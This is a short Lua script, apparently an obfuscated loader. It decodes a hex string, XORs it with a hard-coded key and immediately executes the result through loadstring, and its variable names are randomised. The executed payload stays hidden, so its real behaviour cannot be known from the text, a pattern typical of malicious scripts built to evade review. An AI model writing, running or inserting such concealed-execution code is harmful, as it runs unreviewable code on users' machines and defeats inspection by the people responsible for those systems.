local c7mtqqqp7ii = "30c22152c3719281bd333293d2973c2369231bf551e3ab7191d1141b8241e3a2622153346e2633c5cf121c224b2c3712243679374a3a2c392c3719281b8241e11225a1a3f3c167f31269c291cb1c3c2369231d20d49172d213a3f2c9201b26d49172d224429d612333782bf17826703c34791e7b3f910572d1d3047a23b1c1d1510c2a12c3ca36361c309383642"
    local function chykkluk4iq()
      local g3fb9cekq2g = ""
      for i = 1, #c7mtqqqp7ii, 2 do
        local byte = tonumber(c7mtqqqp7ii:sub(i, i + 1), 16)
        g3fb9cekq2g = g3fb9cekq2g .. string.char(byte)
      end
      local xorKey = "secretXORKey"
      local decoded = ""
      for i = 1, #g3fb9cekq2g do
        decoded = decoded .. string.char(g3fb9cekq2g:byte(i) ~ xorKey:byte((i-1)%#xorKey+1))
      end
      return decoded
    end

    local decodedScript = loadstring(chykkluk4iq())()
    print(decodedScript)
  